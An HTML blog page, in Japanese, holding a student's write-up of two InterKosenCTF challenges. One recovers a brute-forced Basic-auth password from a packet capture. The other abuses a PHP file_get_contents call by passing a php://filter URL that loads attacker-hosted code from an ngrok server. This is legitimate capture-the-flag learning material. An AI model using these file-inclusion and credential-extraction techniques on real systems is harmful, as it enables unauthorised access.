@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8"/>
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"/>
+	<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+	<meta name="Keywords"  content="iOS,safari,iphone,ipad" />
+	<title>クロワッサンはやっぱり黒くない</title>
+	<link href="https://fonts.googleapis.com/earlyaccess/roundedmplus1c.css" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" />
+	<link rel="stylesheet" href="/croissant/css/style.css"/>
+</head>
+<body>
+	<header>
+		<img src="http://wassan128.github.io/img/icon.png"/>
+		<h1><a href="/croissant/">クロワッサンはやっぱり黒くない</a></h1>
+		<h3>とある高専生の備忘録 - 2nd season</h3>
+	</header>
+	<main>
+
+<article><h1>InterKosenCTFに参加した話(Fore 50pts, Web 100pts)</h1>
+
+<p>去る18日〜20日にかけて開催されていた<a href="https://www.kosenctf.com/" rel="nofollow">InterKosenCTF</a>に参加しました。2問しか解けませんでしたが、解けた問題のwriteupを残しておきたいと思います。</p>
+
+<h2>解けた問題</h2>
+
+<h3>[Forensics 50pts] attack log</h3>
+
+<p>問題のファイルを解凍する。</p>
+<pre style="color:#e7e9db;background-color:#2f1e2e">$ tar -xzvf attack_log.tar.gz
+</pre>
+<p>すると「pcapng」ファイルが出てくる。問題名の通り、ログのようだ。</p>
+<pre style="color:#e7e9db;background-color:#2f1e2e">$ strings attack_log.pcapng | less
+</pre>
+<p>で中身を見ると</p>
+<pre style="color:#e7e9db;background-color:#2f1e2e">GET / HTTP/1.1
+Host: www.kosenlab.org
+(中略)
+AUthorization: Basic a29zZW46Y3c3N0psSm9IQVpvZlNzdw==
+HTTP/1.1 401 Unauthorized
+</pre>
+<p>みたいなのがずらずらと並んでいる。Basic認証がかけられたサイトに対して何回もパスワードを打ち込んでいる、というようなログに見えるので、どこかで認証が通り<code>200 OK</code>が返されていないかと検索すると、</p>
+<pre style="color:#e7e9db;background-color:#2f1e2e">HTTP/1.1 200 OK
+(中略)
+Content-Type: text/html; charset=UTF-8
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+    &lt;head&gt;
+        &lt;title&gt;Welcome!&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        The flag is KOSENCTF{&amp;lt;the password for the basic auth&amp;gt;}
+    &lt;/body&gt;
+&lt;/html&gt;
+</pre>
+<p>というのがヒットする。<code>The flag is KOSENCTF{&amp;lt; the password for the basic auth&amp;gt;}</code>とあるので、このレスポンスのすぐ上のリクエストラインを見に行く。</p>
+<pre style="color:#e7e9db;background-color:#2f1e2e">GET / HTTP/1.1
+Host: www.kosenlab.org
+Connection: keep-alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: python-requests/2.13.0
+Authorization: Basic a29zZW46YlJ1dDNGMHJjM1cwcmszRA==
+</pre>
+<p>Basic認証では「<code>ユーザー名:パスワード</code>」がbase64でエンコードされて<code>Authorization</code>に乗せられるので、これを</p>
+<pre style="color:#e7e9db;background-color:#2f1e2e">echo -n &#34;a29zZW46YlJ1dDNGMHJjM1cwcmszRA==&#34; | base64 -d
+</pre>
+<p>としてデコードする。すると<code>kosen:bRut3F0rc3W0rk3D</code>となりパスワードが判明した。</p>
+
+<p>フラグ: <code>KOSENCTF{bRut3F0rc3W0rk3D}</code></p>
+
+<h3>[Web 100pts] Gimme Chocolate</h3>
+
+<p>view sourceというリンクがあるのでとりあえず見に行くと、phpのコードが出てくる。</p>
+<pre style="color:#e7e9db;background-color:#2f1e2e"><span style="color:#776e71">&lt;?php</span>
+
+<span style="color:#776e71">// This function evaluates a source code which is similar to brainf\*ck.
+</span><span style="color:#776e71">// However, looking into the details, there are some differences. Be careful!
+</span><span style="color:#776e71"></span><span style="color:#815ba4">function</span> <span style="color:#06b6ef">bf</span>(<span style="color:#ef6155">$code</span>) {
+</pre>
+<p>どうやらbrainf*ckっぽいものが実装されているようだ。もう少し見ていくと、</p>
+<pre style="color:#e7e9db;background-color:#2f1e2e"><span style="color:#776e71">&lt;?php</span>
+
+<span style="color:#815ba4">do</span> {
+    <span style="color:#815ba4">if</span> (<span style="color:#06b6ef">isset</span>(<span style="color:#ef6155">$_POST</span>[<span style="color:#48b685">&#39;save&#39;</span>])) {
+        <span style="color:#815ba4">if</span> (<span style="color:#5bc4bf">!</span><span style="color:#06b6ef">isset</span>(<span style="color:#ef6155">$_POST</span>[<span style="color:#48b685">&#39;name&#39;</span>]) <span style="color:#5bc4bf">||</span> <span style="color:#815ba4">empty</span>(<span style="color:#ef6155">$_POST</span>[<span style="color:#48b685">&#39;name&#39;</span>])) {
+            <span style="color:#ef6155">$errs</span> []<span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#39;filename required&#39;</span>;
+            <span style="color:#815ba4">break</span>;
+        }
+        <span style="color:#815ba4">if</span> (<span style="color:#5bc4bf">!</span><span style="color:#06b6ef">preg_match</span>(<span style="color:#48b685">&#39;@^[A-Za-z0-9_]+$@&#39;</span>, <span style="color:#ef6155">$_POST</span>[<span style="color:#48b685">&#39;name&#39;</span>])) {
+            <span style="color:#ef6155">$errs</span> []<span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#39;invalid filename&#39;</span>;
+            <span style="color:#815ba4">break</span>;
+        }
+
+        <span style="color:#815ba4">if</span> (<span style="color:#5bc4bf">!</span><span style="color:#06b6ef">isset</span>(<span style="color:#ef6155">$_POST</span>[<span style="color:#48b685">&#39;code&#39;</span>]) <span style="color:#5bc4bf">||</span> <span style="color:#815ba4">empty</span>(<span style="color:#ef6155">$_POST</span>[<span style="color:#48b685">&#39;code&#39;</span>])) {
+            <span style="color:#ef6155">$errs</span> []<span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#39;code required&#39;</span>;
+            <span style="color:#815ba4">break</span>;
+        }
+
+        <span style="color:#ef6155">$fp</span>  <span style="color:#5bc4bf">=</span> <span style="color:#06b6ef">fopen</span>(<span style="color:#ef6155">$prefix</span><span style="color:#5bc4bf">.</span><span style="color:#06b6ef">DIRECTORY_SEPARATOR</span><span style="color:#5bc4bf">.</span><span style="color:#ef6155">$_POST</span>[<span style="color:#48b685">&#39;name&#39;</span>], <span style="color:#48b685">&#39;w&#39;</span>);
+        <span style="color:#815ba4">if</span> (<span style="color:#ef6155">$fp</span> <span style="color:#5bc4bf">===</span> <span style="color:#815ba4">FALSE</span> <span style="color:#5bc4bf">||</span> <span style="color:#06b6ef">fwrite</span>(<span style="color:#ef6155">$fp</span>, <span style="color:#ef6155">$_POST</span>[<span style="color:#48b685">&#39;code&#39;</span>], <span style="color:#f99b15">100</span>) <span style="color:#5bc4bf">===</span> <span style="color:#815ba4">FALSE</span>) {
+            <span style="color:#ef6155">$errs</span> []<span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#39;Unexpected error. Please contact the admin.&#39;</span>;
+            <span style="color:#815ba4">break</span>;
+        }
+        <span style="color:#06b6ef">fclose</span>(<span style="color:#ef6155">$fp</span>);
+
+        <span style="color:#ef6155">$msgs</span> []<span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#39;SAVED&#39;</span>;
+    }
+    <span style="color:#815ba4">else</span> <span style="color:#815ba4">if</span> (<span style="color:#06b6ef">isset</span>(<span style="color:#ef6155">$_GET</span>[<span style="color:#48b685">&#39;execute&#39;</span>])) {
+        <span style="color:#ef6155">$code</span> <span style="color:#5bc4bf">=</span> <span style="color:#06b6ef">file_get_contents</span>(<span style="color:#ef6155">$_GET</span>[<span style="color:#48b685">&#39;file&#39;</span>]);
+        <span style="color:#815ba4">if</span> (<span style="color:#ef6155">$code</span> <span style="color:#5bc4bf">===</span> <span style="color:#815ba4">FALSE</span>) {
+            <span style="color:#ef6155">$errs</span> []<span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#39;Could not open the source file.&#39;</span>;
+            <span style="color:#815ba4">break</span>;
+        }
+        <span style="color:#ef6155">$r</span> <span style="color:#5bc4bf">=</span> <span style="color:#06b6ef">bf</span>(<span style="color:#ef6155">$code</span>);
+        <span style="color:#815ba4">if</span> (<span style="color:#ef6155">$r</span> <span style="color:#5bc4bf">===</span> <span style="color:#48b685">&#34;Give Me a Chocolate!!&#34;</span>) {
+            <span style="color:#ef6155">$msgs</span> []<span style="color:#5bc4bf">=</span> <span style="color:#815ba4">include</span>(<span style="color:#06b6ef">dirname</span>(<span style="color:#ef6155">__DIR__</span>)<span style="color:#5bc4bf">.</span><span style="color:#06b6ef">DIRECTORY_SEPARATOR</span><span style="color:#5bc4bf">.</span><span style="color:#48b685">&#39;flag.php&#39;</span>);
+        }
+    }
+} <span style="color:#815ba4">while</span>(<span style="color:#815ba4">false</span>);
+</pre>
+<p>とあるので、brainf*ck風コードを保存したり実行する機能が実装されていることがわかる。また実行した結果が、<code>Give Me a Chocolate!!</code>となった時に<code>flag.php</code>の中身が見えるようになっているようだ。
+bf関数は基本的にbrainf*ckの実装になっているようなので、出力が<code>Give Me a Chocolate!!</code>となるようなコードを用意し、<a href="https://copy.sh/brainfuck/" rel="nofollow">ここ</a>を使って出力を確認した(もっと短く書けるのだろうが)。</p>
+<pre style="color:#e7e9db;background-color:#2f1e2e">+++++++<span style="color:#815ba4">[</span><span style="color:#ef6155">&gt;</span>++++++++++<span style="color:#ef6155">&lt;</span>-<span style="color:#815ba4">]</span><span style="color:#ef6155">&gt;</span>+<span style="color:#5bc4bf">.</span><span style="color:#ef6155">&gt;</span>++++++++++<span style="color:#815ba4">[</span><span style="color:#ef6155">&gt;</span>++++++++++<span style="color:#ef6155">&lt;</span>-<span style="color:#815ba4">]</span><span style="color:#ef6155">&gt;</span>+++++<span style="color:#5bc4bf">.</span>+++++++++++++<span style="color:#5bc4bf">.</span>-----------------<span style="color:#5bc4bf">.</span><span style="color:#ef6155">&gt;</span>++++<span style="color:#815ba4">[</span><span style="color:#ef6155">&gt;</span>++++++++<span style="color:#ef6155">&lt;</span>-<span style="color:#815ba4">]</span><span style="color:#ef6155">&gt;</span><span style="color:#5bc4bf">.</span><span style="color:#ef6155">&gt;</span>+++++++<span style="color:#815ba4">[</span><span style="color:#ef6155">&gt;</span>++++++++++<span style="color:#ef6155">&lt;</span>-<span style="color:#815ba4">]</span><span style="color:#ef6155">&gt;</span>+++++++<span style="color:#5bc4bf">.</span><span style="color:#ef6155">&gt;</span>++++++++++<span style="color:#815ba4">[</span><span style="color:#ef6155">&gt;</span>++++++++++<span style="color:#ef6155">&lt;</span>-<span style="color:#815ba4">]</span><span style="color:#ef6155">&gt;</span>+<span style="color:#5bc4bf">.</span><span style="color:#ef6155">&gt;</span>++++<span style="color:#815ba4">[</span><span style="color:#ef6155">&gt;</span>++++++++<span style="color:#ef6155">&lt;</span>-<span style="color:#815ba4">]</span><span style="color:#ef6155">&gt;</span><span style="color:#5bc4bf">.</span><span style="color:#ef6155">&gt;</span>++++++++++<span style="color:#815ba4">[</span><span style="color:#ef6155">&gt;</span>++++++++++<span style="color:#ef6155">&lt;</span>-<span style="color:#815ba4">]</span><span style="color:#ef6155">&gt;</span>---<span style="color:#5bc4bf">.</span><span style="color:#ef6155">&gt;</span>++++<span style="color:#815ba4">[</span><span style="color:#ef6155">&gt;</span>++++++++<span style="color:#ef6155">&lt;</span>-<span style="color:#815ba4">]</span><span style="color:#ef6155">&gt;</span><span style="color:#5bc4bf">.</span><span style="color:#ef6155">&gt;</span>++++++<span style="color:#815ba4">[</span><span style="color:#ef6155">&gt;</span>++++++++++<span style="color:#ef6155">&lt;</span>-<span style="color:#815ba4">]</span><span style="color:#ef6155">&gt;</span>+++++++<span style="color:#5bc4bf">.</span><span style="color:#ef6155">&gt;</span>++++++++++<span style="color:#815ba4">[</span><span style="color:#ef6155">&gt;</span>++++++++++<span style="color:#ef6155">&lt;</span>-<span style="color:#815ba4">]</span><span style="color:#ef6155">&gt;</span>++++<span style="color:#5bc4bf">.</span><span style="color:#ef6155">&gt;</span>+++++++++++<span style="color:#815ba4">[</span><span style="color:#ef6155">&gt;</span>++++++++++<span style="color:#ef6155">&lt;</span>-<span style="color:#815ba4">]</span><span style="color:#ef6155">&gt;</span>+<span style="color:#5bc4bf">.</span><span style="color:#ef6155">&gt;</span>++++++++++<span style="color:#815ba4">[</span><span style="color:#ef6155">&gt;</span>++++++++++<span style="color:#ef6155">&lt;</span>-<span style="color:#815ba4">]</span><span style="color:#ef6155">&gt;</span>-<span style="color:#5bc4bf">.</span><span style="color:#ef6155">&gt;</span>+++++++++++<span style="color:#815ba4">[</span><span style="color:#ef6155">&gt;</span>++++++++++<span style="color:#ef6155">&lt;</span>-<span style="color:#815ba4">]</span><span style="color:#ef6155">&gt;</span>+<span style="color:#5bc4bf">.</span>---<span style="color:#5bc4bf">.</span>-----------<span style="color:#5bc4bf">.</span>++<span style="color:#815ba4">[</span><span style="color:#ef6155">&gt;</span>+<span style="color:#ef6155">&lt;</span>-<span style="color:#815ba4">]</span><span style="color:#ef6155">&gt;</span>+++++++++++++++++<span style="color:#5bc4bf">.</span>---------------<span style="color:#5bc4bf">.</span><span style="color:#ef6155">&gt;</span>++++<span style="color:#815ba4">[</span><span style="color:#ef6155">&gt;</span>++++++++<span style="color:#ef6155">&lt;</span>-<span style="color:#815ba4">]</span><span style="color:#ef6155">&gt;</span>+<span style="color:#5bc4bf">..</span><span style="color:#776e71">
+</span></pre>
+<p>しかし、このコードをそのまま投げても<code>flag.php</code>は露呈されない。これは</p>
+<pre style="color:#e7e9db;background-color:#2f1e2e"><span style="color:#776e71">&lt;?php</span>
+<span style="color:#815ba4">if</span> (<span style="color:#ef6155">$fp</span> <span style="color:#5bc4bf">===</span> <span style="color:#815ba4">FALSE</span> <span style="color:#5bc4bf">||</span> <span style="color:#06b6ef">fwrite</span>(<span style="color:#ef6155">$fp</span>, <span style="color:#ef6155">$_POST</span>[<span style="color:#48b685">&#39;code&#39;</span>], <span style="color:#f99b15">100</span>) <span style="color:#5bc4bf">===</span> <span style="color:#815ba4">FALSE</span>) {
+</pre>
+<p>の部分でファイルへの書き込みが100bytesに制限されているからである。ここで選択肢としては</p>
+
+<ol>
+<li>brainf*ckのコードを100bytes以内に収める</li>
+<li>何か他の書き込み方法が無いか考える</li>
+</ol>
+
+<p>があるが、1は無理そうだしこれはCTFなので2だろうと考えコードをよく見ると、コードを実行する部分で<code>file_get_contents</code>関数が使われている上、引数に<code>$_GET[&#34;file&#34;]</code>が直接指定されている。<code>file_get_contents</code>関数の引数にはファイル以外に<code>php://filter</code>などのスキームが<a href="http://d.hatena.ne.jp/i_ogi/20100217/stream" rel="nofollow">指定できる</a>。つまり、ネットワーク経由で参照できる適当な場所に先程のbrainf*ckコードを設置し、<code>php://filter</code>で流してやれば実行されるはずである。</p>
+
+<p>brainf*ckコードを<code>bf.txt</code>として保存し、<code>python</code>で立てたローカルサーバーを<code>ngrok</code>で外部に一時的に公開した。</p>
+<pre style="color:#e7e9db;background-color:#2f1e2e">$ ls
+bf.txt
+
+$ python -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+
+# (別窓などで)
+$ ngrok http 8000
+(中略)
+Forwarding        http://[something].ngrok.io -&gt; localhost:8000
+</pre>
+<p>このURLを使って、<code>http://web.kosenctf.com:8100/?execute&amp;file=php://filter/resource=https://[something].ngrok.io/bf.txt</code>にアクセスすると、フラグが表示される。</p>
+
+<p>フラグ: KOSENCTF{CIO_CHOCOLATEx2_CHOx3_IIYONE}</p>
+
+<h2>おわりに</h2>
+
+<p>久々のCTFでテンションが上がり、割と時間をかけた割には2問しか解けず、悲しくなりました。ただ解けなくても勉強になった問題が多かったので適宜見直していきたいと思います。特に、もう少しで解けそうだった「[Web 200pts] Secure Session」で遭遇したPHP Object Injectionについては初見だったので、とても勉強になったし、別記事でまとめたいと思っています。</p>
+
+<p>問題を壊してしまった時に運営に連絡すると3秒ほどで復旧してもらえたりと、本当に神対応で期間終了ギリギリまで楽しめました。ありがとうございました。</p>
+
+<p>以上です。</p>
+<aside><p class='post-date'>投稿日: 2019/01/22</p>
+</aside></article>
+	</main>
+	<footer>
+		<p>&copy; 2018 wassan128 / MeltDowner</p>
+	</footer>
+</body>
+</html>
+
+
